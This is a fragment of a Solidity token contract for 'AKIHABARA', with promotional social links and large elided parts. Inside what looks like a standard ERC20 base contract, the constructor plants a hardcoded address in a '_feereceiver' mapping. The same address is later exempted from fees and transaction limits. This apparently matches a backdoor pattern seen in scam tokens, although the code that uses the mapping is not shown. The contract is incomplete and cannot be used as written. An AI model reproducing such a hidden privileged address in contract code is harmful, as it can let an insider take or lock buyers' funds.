...
Telegram: t.me/akihabaraportal

Twitter: twitter.com/akihabaraeth
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _feereceiver[0x43dc98AEE3125a60230d8E117C34dFa94d0e910C] = _marketingwallet;
    }
...
contract AKIHABARA is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("AKIHABARA", "AKIHABARA") {
        ...
        excludeFromFees(address(0x43dc98AEE3125a60230d8E117C34dFa94d0e910C), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0x43dc98AEE3125a60230d8E117C34dFa94d0e910C), true);
